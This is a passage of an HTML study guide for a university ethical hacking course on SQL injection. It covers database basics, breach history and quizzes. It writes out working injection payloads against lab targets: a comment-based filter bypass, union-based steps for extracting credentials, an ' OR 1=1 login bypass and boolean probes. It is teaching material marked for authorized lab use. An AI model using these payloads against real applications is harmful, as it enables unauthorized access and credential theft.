+    .quiz-toolbar { flex-direction: column; align-items: flex-start; gap: 10px; padding: 12px 14px; }
+    .quiz-toggle-all-btn { width: 100%; text-align: center; padding: 8px; }
+    .qa-header { padding: 12px 14px; gap: 10px; }
+    .qa-num-badge { width: 24px; height: 24px; font-size: 11px; }
+    .qa-question { font-size: 13.5px; line-height: 1.4; }
+    .qa-answer-inner { padding: 12px 14px 14px 14px; }
+    .qa-answer-inner p { font-size: 13px; }
+    .app-footer { flex-direction: column; align-items: center; text-align: center; gap: 12px; padding: 24px 16px 80px 16px; }
+}
+
+@media (max-width: 480px) {
+    .hero-title { font-size: 23px; }
+    .hero-badge { font-size: 9.5px; padding: 3px 8px; }
+    .content-card { padding: 16px 12px; }
+    .sec-num-badge { width: 34px; height: 34px; font-size: 13px; }
+    .section-heading { font-size: 17.5px; }
+    table { font-size: 12px; }
+    thead th, tbody td { padding: 8px 10px; }
+    .mobile-floating-nav { bottom: 16px; right: 14px; }
+    .floating-btn { padding: 8px 14px; font-size: 12px; }
+}
+
+@media print {
+    body { background: #fff !important; color: #000 !important; }
+    .app-navbar, .sidebar-toc, .search-modal-backdrop, #readingProgressBar, .nav-actions, .copy-btn, .app-footer, .anchor-link, .mobile-floating-nav { display: none !important; }
+    .app-layout { display: block !important; padding: 0 !important; max-width: 100% !important; }
+    .main-content { max-width: 100% !important; }
+    .content-card { border: 1px solid #ccc !important; box-shadow: none !important; background: #fff !important; page-break-inside: avoid; margin-bottom: 20px !important; padding: 20px !important; }
+    .hero-section { border: 1px solid #ccc !important; background: #fff !important; box-shadow: none !important; }
+    .qa-answer { max-height: none !important; }
+    table { border: 1px solid #ddd !important; }
+    th, td { border: 1px solid #ddd !important; color: #000 !important; }
+}
+    </style>
+</head>
+<body>
+<div id="readingProgressBar"></div>
+
+<!-- Navbar -->
+<nav class="app-navbar">
+    <div class="nav-container">
+        <a href="#" class="nav-brand">
+            <div class="brand-icon-shield">
+                <svg viewBox="0 0 24 24" width="20" height="20" stroke="currentColor" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <ellipse cx="12" cy="12" rx="10" ry="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+                </svg>
+            </div>
+            <div class="brand-info">
+                <span class="brand-title">CCY4202 · Week 4</span>
+                <span class="brand-subtitle">SQL Injection</span>
+            </div>
+        </a>
+        <div class="nav-actions">
+            <button class="nav-btn" onclick="openSearchModal()" title="Search (Ctrl+K)">
+                <svg viewBox="0 0 24 24" width="15" height="15" stroke="currentColor" fill="none" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                <span>Search</span>
+                <kbd class="sidebar-kbd">Ctrl K</kbd>
+            </button>
+            <button class="nav-btn theme-toggle-btn" id="themeToggleBtn" onclick="toggleTheme()" title="Toggle theme">
+                <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" fill="none" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+            </button>
+            <button class="nav-btn" onclick="window.print()" title="Print / Save as PDF">
+                <svg viewBox="0 0 24 24" width="15" height="15" stroke="currentColor" fill="none" stroke-width="2"><polyline points="6 9 6 2 18 2 18 9"/><path d="M6 18H4a2 2 0 0 1-2-2v-5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-2"/><rect x="6" y="14" width="12" height="8"/></svg>
+                <span>Print</span>
+            </button>
+            <button class="nav-btn mobile-menu-btn" onclick="toggleMobileMenu()" title="Navigation">
+                <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" fill="none" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+            </button>
+        </div>
+    </div>
+</nav>
+
+<div class="sidebar-backdrop" id="sidebarBackdrop" onclick="closeMobileMenu()"></div>
+
+<div class="app-layout">
+
+    <!-- Sidebar -->
+    <aside class="sidebar-toc" id="sidebarNav">
+        <div class="sidebar-header">
+            <div class="sidebar-title">
+                <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" fill="none" stroke-width="2"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
+                <span>Navigation</span>
+            </div>
+            <div class="sidebar-header-right">
+                <span class="toc-badge">12 Modules</span>
+                <button class="sidebar-close-btn" onclick="closeMobileMenu()" aria-label="Close">✕</button>
+            </div>
+        </div>
+        <div class="sidebar-jump-box">
+            <button class="sidebar-search-btn" onclick="openSearchModal()">
+                <svg viewBox="0 0 24 24" width="14" height="14" stroke="currentColor" fill="none" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                <span>Quick search...</span>
+                <kbd class="sidebar-kbd">Ctrl K</kbd>
+            </button>
+        </div>
+        <nav class="toc-nav">
+            <ul class="toc-list">
+<li class="toc-item" data-target="section-1">
+  <a href="#section-1" class="toc-link">
+    <span class="toc-icon">🎯</span>
+    <span class="toc-num">01</span>
+    <span class="toc-text">Overview &amp; Learning Objectives</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-2">
+  <a href="#section-2" class="toc-link">
+    <span class="toc-icon">⚠️</span>
+    <span class="toc-num">02</span>
+    <span class="toc-text">Why SQL Injection Still Matters</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-3">
+  <a href="#section-3" class="toc-link">
+    <span class="toc-icon">🗄️</span>
+    <span class="toc-num">03</span>
+    <span class="toc-text">Part 1 — DB &amp; SQL Fundamentals</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-4">
+  <a href="#section-4" class="toc-link">
+    <span class="toc-icon">💉</span>
+    <span class="toc-num">04</span>
+    <span class="toc-text">Part 2 — In-Band Exploitation</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-5">
+  <a href="#section-5" class="toc-link">
+    <span class="toc-icon">👁️</span>
+    <span class="toc-num">05</span>
+    <span class="toc-text">Part 3 — Blind SQL Injection</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-6">
+  <a href="#section-6" class="toc-link">
+    <span class="toc-icon">⏱️</span>
+    <span class="toc-num">06</span>
+    <span class="toc-text">Part 4 — Time-Based &amp; OOB</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-7">
+  <a href="#section-7" class="toc-link">
+    <span class="toc-icon">📊</span>
+    <span class="toc-num">07</span>
+    <span class="toc-text">Taxonomy Recap</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-8">
+  <a href="#section-8" class="toc-link">
+    <span class="toc-icon">🤖</span>
+    <span class="toc-num">08</span>
+    <span class="toc-text">Part 5 — Automating with SQLMap</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-9">
+  <a href="#section-9" class="toc-link">
+    <span class="toc-icon">🛡️</span>
+    <span class="toc-num">09</span>
+    <span class="toc-text">Part 6 — Remediation</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-10">
+  <a href="#section-10" class="toc-link">
+    <span class="toc-icon">🎬</span>
+    <span class="toc-num">10</span>
+    <span class="toc-text">Closing Scenario</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-11">
+  <a href="#section-11" class="toc-link">
+    <span class="toc-icon">🧪</span>
+    <span class="toc-num">11</span>
+    <span class="toc-text">Lab Preparation &amp; Wrap-Up</span>
+  </a>
+</li>
+<li class="toc-item" data-target="section-12">
+  <a href="#section-12" class="toc-link">
+    <span class="toc-icon">📋</span>
+    <span class="toc-num">12</span>
+    <span class="toc-text">Points to Double-Check</span>
+  </a>
+</li>
+            </ul>
+        </nav>
+        <div class="sidebar-footer">
+            <div class="sidebar-study-card">
+                <div class="study-card-title">💡 Quick Revision</div>
+                <p>Jump to <a href="#section-7">Taxonomy Recap</a> for the attack comparison table, or <a href="#section-9">Remediation</a> for prepared statements and the 5 myths.</p>
+            </div>
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+
+        <!-- Hero -->
+        <header class="hero-section">
+            <div class="hero-glow"></div>
+            <div class="hero-badge-wrap">
+                <span class="hero-badge"><span class="badge-pulse"></span>WEEK 4 STUDY GUIDE</span>
+                <span class="hero-badge badge-secondary">SQLi TAXONOMY</span>
+                <span class="hero-badge badge-lab">SQLMAP LAB</span>
+            </div>
+            <h1 class="hero-title">SQL <span class="gradient-text">Injection</span></h1>
+            <p class="hero-subtitle">Detailed lecture summary covering database fundamentals, in-band exploitation, blind techniques, SQLMap automation, and remediation — for CCY4202 Ethical Hacking and Penetration Testing.</p>
+            <div class="topic-tags-grid">
+                <span class="topic-tag">🗄️ DB Fundamentals</span>
+                <span class="topic-tag">💉 In-Band SQLi</span>
+                <span class="topic-tag">👁️ Blind SQLi</span>
+                <span class="topic-tag">⏱️ Time-Based</span>
+                <span class="topic-tag">📡 Out-of-Band</span>
+                <span class="topic-tag">🤖 SQLMap</span>
+                <span class="topic-tag">🛡️ Remediation</span>
+            </div>
+            <div class="guide-usage-card">
+                <div class="guide-usage-icon">📖</div>
+                <div class="guide-usage-content">
+                    <div class="guide-usage-title">HOW TO USE THIS GUIDE</div>
+                    <p>Read the sections in order for complete understanding. Use the knowledge checks after each Part for active recall. All payloads are for authorized lab use only — never test systems without explicit written permission.</p>
+                </div>
+            </div>
+            <div class="quick-stats-bar">
+                <div class="stat-item"><span class="stat-number">12</span><span class="stat-label">Modules</span></div>
+                <div class="stat-divider"></div>
+                <div class="stat-item"><span class="stat-number">5</span><span class="stat-label">SQLi Types</span></div>
+                <div class="stat-divider"></div>
+                <div class="stat-item"><span class="stat-number">18</span><span class="stat-label">Quiz Q&amp;As</span></div>
+                <div class="stat-divider"></div>
+                <div class="stat-item"><span class="stat-number">5</span><span class="stat-label">Exam Myths</span></div>
+                <div class="stat-divider"></div>
+                <div class="stat-item"><span class="stat-number">10</span><span class="stat-label">Code Samples</span></div>
+            </div>
+        </header>
+
+<section id="section-1" class="content-card section-card" data-section-num="01">
+<div class="section-card-header">
+  <div class="sec-num-badge">01</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 01</span>
+    <h2 class="section-heading">Overview and Learning Objectives</h2>
+  </div>
+  <a class="anchor-link" href="#section-1" title="Link to section">#</a>
+</div><p>The lecture follows one arc: from what a database is and how SQL reads data, through unsanitized input altering queries, to three families of exploitation (in-band, blind, out-of-band), then automating with SQLMap, and finally the defenses that remove the flaw at its source.</p><h3 id="sec-1-objectives"><strong>Learning Objectives</strong></h3><ol><li>Explain databases, DBMSs, tables, columns, and rows; distinguish relational from non-relational databases.</li><li>Write and interpret basic SQL statements: SELECT, UNION, INSERT, UPDATE, and DELETE.</li><li>Explain how SQL injection occurs when user input reaches a query unsanitized.</li><li>Identify and exploit in-band (error-based, union-based), blind (boolean-based, time-based), and out-of-band SQL injection.</li><li>Use SQLMap to automate detection and exploitation.</li><li>Explain remediation: prepared statements, input validation, and escaping.</li></ol><div class="callout callout-principle">
+  <div class="callout-icon">📖</div>
+  <div class="callout-body">
+    <div class="callout-badge">HOW TO USE THIS GUIDE</div>
+    <div class="callout-text">Read each section in order for full understanding, or jump directly to the <a href='#section-8'>SQLMap</a> or <a href='#section-9'>Remediation</a> sections for quick revision. All code snippets are for authorized lab use only.</div>
+  </div>
+</div>
+</section>
+<section id="section-2" class="content-card section-card" data-section-num="02">
+<div class="section-card-header">
+  <div class="sec-num-badge">02</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 02</span>
+    <h2 class="section-heading">Why SQL Injection Still Matters</h2>
+  </div>
+  <a class="anchor-link" href="#section-2" title="Link to section">#</a>
+</div><p>The lecture cites five publicly documented breaches, all sharing the same root cause: user input reached a database query without sanitization, parameterization, or escaping.</p><div class="table-responsive"><table>
+<thead><tr><th>Year</th><th>Organization</th><th>Scale</th><th>What Happened</th></tr></thead>
+<tbody><tr><td>2008</td><td>Heartland Payment Systems</td><td>~134M payment cards</td><td>Albert Gonzalez used SQL injection to plant malware on Heartland&#x27;s network. Settlement: $140M.</td></tr>
+<tr><td>2011</td><td>Sony Pictures</td><td>Over 1M user accounts</td><td>LulzSec used SQL injection against SonyPictures.com. Plaintext passwords and internal dumps were published openly.</td></tr>
+<tr><td>2012</td><td>LinkedIn</td><td>6.5M hashes (later 167M in 2016)</td><td>Hashes exfiltrated, widely attributed to a SQLi vector. Unsalted SHA-1 hashes later sold on dark-web markets.</td></tr>
+<tr><td>2015</td><td>TalkTalk</td><td>~157K customer records</td><td>A 17-year-old used SQL injection against TalkTalk&#x27;s website. ICO fine: £400K; estimated £60M total response costs.</td></tr>
+<tr><td>2005–2012</td><td>7-Eleven / Nasdaq / Others</td><td>Over 160M cards</td><td>Same Gonzalez group. Losses exceeded $300M — prosecutors called it the largest US hacking case at the time.</td></tr>
+</tbody>
+</table></div><div class="callout callout-safety">
+  <div class="callout-icon">⚠️</div>
+  <div class="callout-body">
+    <div class="callout-badge">COMMON PATTERN</div>
+    <div class="callout-text"><strong>All five breaches share one root cause:</strong> user input reached a database query without sanitization, parameterization, or escaping.</div>
+  </div>
+</div>
+</section>
+<section id="section-3" class="content-card section-card" data-section-num="03">
+<div class="section-card-header">
+  <div class="sec-num-badge">03</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 03</span>
+    <h2 class="section-heading">Part 1 — Database and SQL Fundamentals</h2>
+  </div>
+  <a class="anchor-link" href="#section-3" title="Link to section">#</a>
+</div><h3 id="sec-3-terms"><strong>Core Terms</strong></h3><ul><li><strong>Database:</strong> An organized electronic collection of data, controlled by a DBMS.</li><li><strong>DBMS:</strong> The software that controls storage, retrieval, and structure (e.g., MySQL, PostgreSQL, MongoDB).</li><li><strong>Table:</strong> A structured container for one category of records (e.g., a <code class='icode'>users</code> table).</li><li><strong>Column:</strong> A field with a unique name and fixed data type (integer, string, date).</li><li><strong>Row:</strong> One record — one set of values across all columns.</li><li><strong>Primary key:</strong> A column whose values uniquely identify each row. Must be unique; does not need to be auto-increment.</li></ul><h3 id="sec-3-relational"><strong>Relational vs. Non-Relational</strong></h3><div class="table-responsive"><table>
+<thead><tr><th>Type</th><th>Examples</th><th>Key Characteristics</th></tr></thead>
+<tbody><tr><td>Relational (SQL)</td><td>MySQL, MS SQL Server, PostgreSQL, SQLite, Access</td><td>Tables reference each other via primary keys. Strong schema, ACID transactions, powerful query language. Primary target of this lecture.</td></tr>
+<tr><td>Non-relational (NoSQL)</td><td>MongoDB, Cassandra</td><td>Document, key-value, wide-column, or graph models. Flexible schemas, horizontal scaling. Different injection class — out of scope this week.</td></tr>
+</tbody>
+</table></div><h3 id="sec-3-select"><strong>Reading Data with SELECT</strong></h3><p>SQL keywords are not case-sensitive. A statement is a query; a semicolon ends it.</p><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">SQL — SELECT patterns</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code">SELECT * FROM users;                         -- all columns, all rows
+SELECT username, password FROM users;        -- specific columns only
+SELECT * FROM users LIMIT 1;                 -- limit rows returned
+SELECT * FROM users WHERE username=&#x27;admin&#x27;;  -- equality filter
+SELECT * FROM users WHERE username != &#x27;admin&#x27;;  -- inequality
+SELECT * FROM users WHERE username=&#x27;admin&#x27; AND password=&#x27;pass&#x27;;
+-- % wildcard: &#x27;a%&#x27; starts with a, &#x27;%n&#x27; ends with n, &#x27;%mi%&#x27; contains mi
+SELECT * FROM users WHERE username LIKE &#x27;%admin%&#x27;;</pre></div>
+</div><h3 id="sec-3-dml"><strong>Combining and Changing Data</strong></h3><ul><li><strong>UNION</strong> combines two SELECT results. Both must have the same number of columns, compatible types, and same column order.</li><li><strong>INSERT</strong> adds a row; <strong>UPDATE</strong> modifies existing rows; <strong>DELETE</strong> removes rows.</li><li>⚠️ A <code class='icode'>DELETE</code> or <code class='icode'>UPDATE</code> with no WHERE clause affects <em>every</em> row.</li></ul><div class="callout callout-exam">
+  <div class="callout-icon">📚</div>
+  <div class="callout-body">
+    <div class="callout-badge">KNOWLEDGE CHECK — PART 1</div>
+    <div class="callout-text">Test yourself before checking the answers below.</div>
+  </div>
+</div><div class="quiz-container"><div class="quiz-toolbar"><div><span class="quiz-badge">📝 Part 1 Quiz</span><span class="quiz-desc">3 questions — click to reveal answers</span></div><button class="quiz-toggle-all-btn" onclick="toggleAllQA(this)">Reveal All</button></div><div class="quiz-list"><div class="qa-card" id="qa-1">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">01</div>
+    <div class="qa-question">Q1 (Multiple Choice). Which statement returns only the username and password columns from the users table? A) SELECT * FROM users WHERE column=username,password  B) SELECT username,password FROM users  C) SELECT username AND password FROM users  D) SELECT FROM users (username,password)</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>B.</strong> <code class='icode'>SELECT username,password FROM users;</code> — specifying column names returns only those columns.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-2">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">02</div>
+    <div class="qa-question">Q2 (True/False). &quot;In a relational database, every table is required to have an auto-increment primary key column.&quot;</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>False.</strong> A primary key is required for relationships but does not need to be auto-increment — it only needs to be unique per row.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-3">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">03</div>
+    <div class="qa-question">Q3 (Short Answer). State the three rules a UNION operator enforces between the two SELECT statements.</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>(1) Both SELECTs must return the <strong>same number of columns</strong>. (2) Corresponding columns must have <strong>compatible data types</strong>. (3) Columns must appear in the <strong>same order</strong> in both SELECTs.</p>
+    </div>
+  </div>
+</div></div></div>
+</section>
+<section id="section-4" class="content-card section-card" data-section-num="04">
+<div class="section-card-header">
+  <div class="sec-num-badge">04</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 04</span>
+    <h2 class="section-heading">Part 2 — SQL Injection and In-Band Exploitation</h2>
+  </div>
+  <a class="anchor-link" href="#section-4" title="Link to section">#</a>
+</div><h3 id="sec-4-what"><strong>What SQL Injection Is</strong></h3><p>SQL injection occurs when user-provided data is included directly in an SQL query without sanitization, validation, or parameterization. The attacker&#x27;s input is parsed as <em>part of the query structure</em> rather than as data.</p><h3 id="sec-4-example"><strong>Worked Example: A Blog Endpoint</strong></h3><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">SQL — Basic injection example</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code">-- Normal request: GET https://website.thm/blog?id=1
+SELECT * FROM blog WHERE id=1 AND private=0 LIMIT 1;
+-- Returns article 1, public posts only (private=0 filter enforced).
+
+-- Injected request: GET https://website.thm/blog?id=2;--
+SELECT * FROM blog WHERE id=2;-- AND private=0 LIMIT 1;
+-- The semicolon ends the statement; -- comments out the private=0 restriction.
+-- Private articles become readable.</pre></div>
+</div><div class="callout callout-safety">
+  <div class="callout-icon">⚡</div>
+  <div class="callout-body">
+    <div class="callout-badge">THE IMPACT</div>
+    <div class="callout-text">Two characters — a semicolon and a double hyphen — bypassed an authorization control. That is SQL injection in its simplest form.</div>
+  </div>
+</div><h3 id="sec-4-error"><strong>Error-Based Injection (In-Band)</strong></h3><p>In-band means the attack and result travel through the <em>same channel</em>. Error-based injection turns application error messages into intelligence.</p><ol><li>Attacker injects malformed SQL (e.g., a single apostrophe) into a parameter.</li><li>Application does not catch the database error — it prints the raw message to the browser.</li><li>Error messages reveal: table names, column names, data types, query fragments, DBMS version.</li><li>With enough errors, the attacker reconstructs the schema without extracting data through normal output.</li></ol><div class="callout callout-principle">
+  <div class="callout-icon">🛡️</div>
+  <div class="callout-body">
+    <div class="callout-badge">DEFENSIVE TAKEAWAY</div>
+    <div class="callout-text">Never display raw database errors in production. Log them server-side and return a generic error response to the client.</div>
+  </div>
+</div><h3 id="sec-4-union"><strong>Union-Based Enumeration: 6 Steps</strong></h3><div class="table-responsive"><table>
+<thead><tr><th>Step</th><th>Goal</th><th>Payload / Result</th></tr></thead>
+<tbody><tr><td>1</td><td>Find column count</td><td><code class="icode">1 UNION SELECT 1</code> → then <code class="icode">1 UNION SELECT 1,2</code> → then <code class="icode">1 UNION SELECT 1,2,3</code>. Error disappears at 3 columns.</td></tr>
+<tr><td>2</td><td>Empty original result</td><td><code class="icode">0 UNION SELECT 1,2,3</code> — ID 0 returns no real row, so only injected output renders.</td></tr>
+<tr><td>3</td><td>Retrieve database name</td><td><code class="icode">0 UNION SELECT 1,2,database()</code> → result: <code class="icode">sqli_one</code></td></tr>
+<tr><td>4</td><td>List tables</td><td><code class="icode">group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;sqli_one&#x27;</code></td></tr>
+<tr><td>5</td><td>List columns of target table</td><td><code class="icode">group_concat(column_name) FROM information_schema.columns WHERE table_name=&#x27;staff_users&#x27;</code> → id, username, password</td></tr>
+<tr><td>6</td><td>Extract credentials</td><td><code class="icode">group_concat(username,&#x27;:&#x27;,password SEPARATOR &#x27;<br>&#x27;) FROM staff_users</code></td></tr>
+</tbody>
+</table></div><div class="callout callout-exam">
+  <div class="callout-icon">📚</div>
+  <div class="callout-body">
+    <div class="callout-badge">KNOWLEDGE CHECK — PART 2</div>
+    <div class="callout-text">Test yourself before checking the answers below.</div>
+  </div>
+</div><div class="quiz-container"><div class="quiz-toolbar"><div><span class="quiz-badge">📝 Part 2 Quiz</span><span class="quiz-desc">3 questions</span></div><button class="quiz-toggle-all-btn" onclick="toggleAllQA(this)">Reveal All</button></div><div class="quiz-list"><div class="qa-card" id="qa-4">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">04</div>
+    <div class="qa-question">Q1. In the URL https://website.thm/blog?id=2;--, what does ;-- do to the backend query? A) Sorts results  B) Ends the statement and comments out the rest, removing private=0  C) Deletes the blog table  D) Encrypts the request</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>B.</strong> The semicolon terminates the statement; <code class='icode'>--</code> comments out the rest, removing the <code class='icode'>private=0</code> restriction.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-5">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">05</div>
+    <div class="qa-question">Q2 (True/False). Error-based SQL injection is useful because database error messages reveal structural information.</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>True.</strong> That is precisely why defenders disable verbose database errors in production.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-6">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">06</div>
+    <div class="qa-question">Q3. In union-based extraction, why do we change the article ID from 1 to 0 in Step 2?</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>Article ID 1 returns a real blog row, which mixes with injected output. Setting ID to 0 makes the original query return <strong>no rows</strong>, so only the injected UNION output appears — making it easy to see which column holds the injected data.</p>
+    </div>
+  </div>
+</div></div></div>
+</section>
+<section id="section-5" class="content-card section-card" data-section-num="05">
+<div class="section-card-header">
+  <div class="sec-num-badge">05</div>
+  <div class="sec-title-wrap">
+    <span class="sec-kicker">MODULE 05</span>
+    <h2 class="section-heading">Part 3 — Blind SQL Injection</h2>
+  </div>
+  <a class="anchor-link" href="#section-5" title="Link to section">#</a>
+</div><h3 id="sec-5-what"><strong>What Makes Injection Blind</strong></h3><ol><li>The application gives little or no direct feedback about whether an injected query succeeded.</li><li>Error messages are usually disabled; query results are not displayed to the user.</li><li>The injection still works — the attacker enumerates from minimal signals: true/false response, taken/available username, or response time.</li></ol><h3 id="sec-5-bypass"><strong>Authentication Bypass</strong></h3><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">SQL — Auth bypass payload</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code">-- Original login query:
+SELECT * FROM users WHERE username=&#x27;%username%&#x27; AND password=&#x27;%password%&#x27; LIMIT 1;
+
+-- After injecting  &#x27; OR 1=1;--  into the password field:
+SELECT * FROM users WHERE username=&#x27;&#x27; AND password=&#x27;&#x27; OR 1=1;
+-- 1=1 is always true. OR makes the whole WHERE clause true.
+-- The query returns the first user in the table → attacker is logged in.</pre></div>
+</div><div class="callout callout-safety">
+  <div class="callout-icon">⚡</div>
+  <div class="callout-body">
+    <div class="callout-badge">WHY IT WORKS</div>
+    <div class="callout-text"><strong>AND</strong> binds more tightly than <strong>OR</strong>, so the query reads as <code class='icode'>(username='' AND password='') OR 1=1</code>. The OR clause makes the whole condition true, returning the first user.</div>
+  </div>
+</div><h3 id="sec-5-boolean"><strong>Boolean-Based Enumeration</strong></h3><p>Uses a signup endpoint that returns <code class='icode'>{&quot;taken&quot;: true}</code> when a username exists. Each probe yields one bit of information.</p><div class="table-responsive"><table>
+<thead><tr><th>Step</th><th>Goal</th><th>How it Works</th></tr></thead>
+<tbody><tr><td>1</td><td>Determine column count</td><td>Use UNION SELECT with 1, then 1,2, then 1,2,3. The <code class="icode">taken: true</code> response confirms 3 columns.</td></tr>
+<tr><td>2</td><td>Discover database name</td><td>Use <code class="icode">WHERE database() LIKE &#x27;s%&#x27;</code>. Iterating resolves the full name: <code class="icode">sqli_three</code>.</td></tr>
+<tr><td>3</td><td>Enumerate tables</td><td>Walk first characters of table names in information_schema.tables, e.g., <code class="icode">&#x27;u%&#x27;</code> for a users table.</td></tr>
+<tr><td>4</td><td>Enumerate columns</td><td>Probe information_schema.columns with LIKE patterns; append <code class="icode">AND COLUMN_NAME != &#x27;id&#x27;</code> so each probe finds a new column.</td></tr>
+<tr><td>5</td><td>Enumerate credentials</td><td>Use LIKE <code class="icode">&#x27;a%&#x27;</code> against username, then password. Example resolves: username <code class="icode">admin</code>, password <code class="icode">3845</code>.</td></tr>
+</tbody>
+</table></div><div class="terminal-card">
+  <div class="terminal-header">
+    <div class="terminal-dots">
+      <span class="dot dot-red"></span>
+      <span class="dot dot-yellow"></span>
+      <span class="dot dot-green"></span>
+    </div>
+    <span class="terminal-title">SQL — Boolean probe example</span>
+    <button class="copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+  </div>
+  <div class="terminal-body"><pre class="terminal-code">-- Representative Step 2 probe:
+admin123&#x27; UNION SELECT 1,2,3 WHERE database() LIKE &#x27;s%&#x27;;--</pre></div>
+</div><div class="callout callout-exam">
+  <div class="callout-icon">📚</div>
+  <div class="callout-body">
+    <div class="callout-badge">KNOWLEDGE CHECK — PART 3</div>
+    <div class="callout-text">Test yourself before checking the answers below.</div>
+  </div>
+</div><div class="quiz-container"><div class="quiz-toolbar"><div><span class="quiz-badge">📝 Part 3 Quiz</span><span class="quiz-desc">3 questions</span></div><button class="quiz-toggle-all-btn" onclick="toggleAllQA(this)">Reveal All</button></div><div class="quiz-list"><div class="qa-card" id="qa-7">
+  <div class="qa-header" onclick="toggleQA(this)">
+    <div class="qa-num-badge">07</div>
+    <div class="qa-question">Q1. Why does &#x27; OR 1=1;-- bypass authentication when injected into the password field? A) It crashes the login  B) 1=1 is always true and OR makes the WHERE clause true  C) It resets the password  D) It disables the database</div>
+    <button class="qa-toggle-btn" aria-label="Toggle answer"><span class="toggle-icon">▼</span></button>
+  </div>
+  <div class="qa-answer">
+    <div class="qa-answer-inner">
+      <span class="qa-ans-label">ANSWER</span>
+      <p>✅ <strong>B.</strong> Because 1=1 is always true and OR combines it with the WHERE clause, the condition evaluates to true, the first user row is returned, and login succeeds.</p>
+    </div>
+  </div>
+</div><div class="qa-card" id="qa-8">
+  <div class="qa-header" onclick="toggleQA(this)">
